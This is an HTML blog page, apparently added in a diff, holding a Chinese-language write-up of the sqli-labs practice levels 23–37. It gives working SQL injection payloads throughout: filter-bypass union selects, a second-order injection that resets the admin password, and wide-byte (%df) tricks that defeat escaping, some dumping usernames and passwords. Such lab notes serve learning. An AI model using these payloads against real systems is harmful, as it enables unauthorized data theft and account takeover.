@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Less-23 过滤注释符首先随便给个1’，然后再1‘ or ‘1’&#x3D;’1，根据两次回显信息可知，对id的处理为**‘$id’**，然后尝试一般的注入流程，得到报错，从源码中才得知所以这里我们的payload中就不能包含注释符，那么就尝试将右边的单引号给去掉         1 2 ?id&#x3D;-1&#39; union select 1,2,3 or &#39;1&#39;&#x3D;&#39;1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli labs23-37学习笔记">
+<meta property="og:url" content="https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Intro&#39; Blog">
+<meta property="og:description" content="Less-23 过滤注释符首先随便给个1’，然后再1‘ or ‘1’&#x3D;’1，根据两次回显信息可知，对id的处理为**‘$id’**，然后尝试一般的注入流程，得到报错，从源码中才得知所以这里我们的payload中就不能包含注释符，那么就尝试将右边的单引号给去掉         1 2 ?id&#x3D;-1&#39; union select 1,2,3 or &#39;1&#39;&#x3D;&#39;1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less24.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less25.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less26.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less27.png">
+<meta property="article:published_time" content="2018-10-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-10-29T10:14:15.480Z">
+<meta property="article:author" content="Intro">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less24.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>sqli labs23-37学习笔记</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/1ntro">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/10/18/sqli%20labs38-53%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/10/11/sqli%20labs17-22%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=sqli labs23-37学习笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs23-37学习笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=sqli labs23-37学习笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqli labs23-37学习笔记&body=Check out this article: https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs23-37学习笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs23-37学习笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs23-37学习笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs23-37学习笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=sqli labs23-37学习笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=sqli labs23-37学习笔记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        sqli labs23-37学习笔记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Intro</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-10-12T16:00:00.000Z" class="dt-published" itemprop="datePublished">2018-10-13</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Less-23 过滤注释符首先随便给个<strong>1’</strong>，然后再<strong>1‘ or ‘1’&#x3D;’1</strong>，根据两次回显信息可知，对id的处理为**‘$id’**，然后尝试一般的注入流程，得到报错，从源码中才得知<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less24.png" alt="1539406316390"><br>所以这里我们的payload中就不能包含注释符，那么就尝试将右边的单引号给去掉</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2</code></td>
+<td><code>?id=-1&#39; union select 1,2,3 or &#39;1&#39;=&#39;1   //没有报错 ?id=-1&#39; union select 1,2,3,4 or &#39;1&#39;=&#39;1 //得到报错，得知列名有三行，并知道了有回显的那一行</code></td>
+</tr>
+</tbody></table>
+<p>然后就很简单了<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less25.png" alt="1539406964291">Less-24 二次注入（储存型注入）第一次解除这种类型的题，网上搜了下思路：</p>
+<ol>
+<li>通过构造数据提交到服务端进行处理</li>
+<li>服务端将数据存储到数据库</li>
+<li>再次向服务端提交请求，导致第一次构造的SQL语句得到执行</li>
+<li>服务端返回结果<br>这里我们首先注册一个**admin’#**的账号，密码为123，然后登录该账号修改密码，此时修改的就是admin的密码，源码：<br><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;</code><br>相当于我们执行了<code>$sql = &quot;UPDATE users SET PASSWORD=&#39;newpassword&#39; where username=&#39;admin&#39;#&#39; and password=&#39;123&#39; &quot;;</code>这样就修改admin的密码为newpassword</li>
+</ol>
+<p>Less-25 过滤or、and本关考察对or和and的过滤，一般几个思路：</p>
+<ol>
+<li>大小写变形Or OR oR</li>
+<li>编码，hex，urlencode</li>
+<li>添加注释<code>/*or*/</code></li>
+<li>and &#x3D; &amp;&amp;、or &#x3D; ||</li>
+<li>重复 oorr、aandnd</li>
+</ol>
+<p>Less-25a只是在本题的基础上对id的处理更改了，不做累赘Less-26 各种符号过滤这里的<strong>空格，or，and，#，–，&#x2F;<strong>等各种符号全被过滤了<br>对于注释和结尾字符此处只能构造一个</strong>‘<strong>来闭合<br>对于空格：<br>%09&#x3D;&gt;TAB键（水平）<br>%0a&#x3D;&gt;新建一行<br>%0c&#x3D;&gt;新的一页<br>%0d&#x3D;&gt;return 键<br>%0b&#x3D;&gt;TAB键（垂直）<br>%a0&#x3D;&gt;空格 &#x2F;&#x2F;Windows貌似不行丢个payload：<br><code>?id=&#39;%0bunion%0bselect%0b1,group_concat(username,&#39;:&#39;,passwoorrd),3%0bfrom%0busers%0bwhere%0bid=&#39;1</code>Less-26a在此基础上对输入值进行</strong>(‘$id’)<strong>处理Less-27 过滤union、select通过测试发现union、select、各种字符被过滤掉，字符的过滤和上一节一样，union的过滤可以大小写或者重复（重复两次就试试三次，这里select重复了三次），给个payload：<br><code>?id=&#39;%0buunionnion%0bseleselselectectct%0b1,2,3%0bor%0b&#39;1</code>Less-27a对id处理为</strong>“$id”</strong><br><code>http://127.0.0.1/sqli-labs-master/Less-27a/?id=&quot;%0buniunionon%0bsElect%0b1,2,3||&quot;1</code>Less-28依然还是各种过滤，这里只要一步步测试测出被过滤的字符，然后想办法绕过过滤，构造我们想要的payload就行<br><code>?id=&#39;)%0bUnion%0bseLect%0b(1),group_concat(username,&#39;:&#39;,password),3%0bfrom%0busers%0bwhere%0b2%26%26%0b(&#39;2</code>Less-28a感觉和本题差不多的，就不写了吧Less-32 宽字节注入如何绕过WAF研究了一下WAF绕过的姿势，看了几篇文章，很有用<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/68991.html%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E8%BE%93%E5%85%A5%60?id=1%27%60%EF%BC%8C%E5%8F%91%E7%8E%B0%E8%A2%AB%E5%8A%A0%E4%B8%8A%E4%BA%86%60%5C%60%EF%BC%8C%E8%BF%99%E9%87%8C%E8%A6%81%E5%AD%A6%E4%B9%A0%E4%B8%80%E4%B8%8B%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%BD%93mysql%E4%BD%BF%E7%94%A8GBK%E7%BC%96%E7%A0%81%E6%97%B6%EF%BC%8C%E4%BC%9A%E6%8A%8A%E4%B8%A4%E4%B8%AA%E5%AD%97%E7%AC%A6%E8%A7%86%E4%B8%BA%E4%B8%80%E4%B8%AA%E6%B1%89%E5%AD%97%EF%BC%8C%E7%B1%BB%E4%BC%BC%EF%BF%BD%5C%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AA%E6%B1%89%E5%AD%97%EF%BC%88%E5%89%8D%E4%B8%80%E4%B8%AAASCII%E7%A0%81%E5%A4%A7%E4%BA%8E128%E6%89%8D%E8%83%BD%E5%88%B0%E6%B1%89%E5%AD%97%E7%9A%84%E8%8C%83%E5%9B%B4%EF%BC%89%EF%BC%8C%E8%BF%87%E6%BB%A4%60%27%60%E7%9A%84%E6%97%B6%E5%80%99%E5%BE%80%E5%BE%80%E6%98%AF%E5%B0%86%E5%85%B6%E8%BD%AC%E6%8D%A2%E4%B8%BA%60%5C%27%60%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E6%83%B3%E5%8A%9E%E6%B3%95%E5%B0%86%E5%89%8D%E9%9D%A2%E7%9A%84%60%5C%60%E5%8E%BB%E6%8E%89">https://www.secpulse.com/archives/68991.html宽字节注入输入`?id=1&#39;`，发现被加上了`\`，这里要学习一下宽字节注入，当mysql使用GBK编码时，会把两个字符视为一个汉字，类似%aa%5c就是一个汉字（前一个ASCII码大于128才能到汉字的范围），过滤`&#39;`的时候往往是将其转换为`\&#39;`，所以我们想办法将前面的`\`去掉</a></p>
+<ol>
+<li>在前面加上%df，urlencode(\‘) &#x3D; %5c%27，在前面加上%df就成了%df%5c%27，而%df%5c就是一个汉字，所以逃过了<code>\</code></li>
+<li>将<code>\</code>去掉，在前加上一个或奇数个<code>\</code>,后面的%5c就会被前面的注释掉</li>
+</ol>
+<p>看题目<img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less26.png" alt="1539601311894"><br>这个函数过滤了<code>&#39; \ &quot;</code>，在其前面加上**&#x2F;**进行转义，所以我们可以用第一种方法，payload：<br><code>?id=%df&#39; union select 1,2,3--+</code>Less-33 addslashes()-GETaddslashes()函数返回在预定义字符之前添加反斜杠的字符串，预定义字符为：<code>&#39; &quot; \ NULL</code>，所以和上一题是差不多的Less-34 addslashes()-POSTPOST形式的宽字节注入，一样的解法Less-35这里没有对id进行处理，很简单<br>payload：<code>?id=-1 union select 1,database(),3--+</code>Less-36<img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less27.png" alt="1539604048486"><br>本关利用了mysql_real_escape_string()进行了过滤，它转义SQL语句中使用的字符串中的特殊字符，下列字符受影响：</p>
+<ul>
+<li>\x00</li>
+<li>\n</li>
+<li>\r</li>
+<li>\</li>
+<li>‘</li>
+<li>“</li>
+<li>\x1a</li>
+</ul>
+<p>Less-37还是POST的宽字节注入，只是过滤的函数不同</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/1ntro">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=sqli labs23-37学习笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs23-37学习笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=sqli labs23-37学习笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqli labs23-37学习笔记&body=Check out this article: https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs23-37学习笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs23-37学习笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs23-37学习笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs23-37学习笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=sqli labs23-37学习笔记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://1ntro.github.io/2018/10/13/sqli%20labs23-37%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=sqli labs23-37学习笔记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Intro
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/1ntro">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
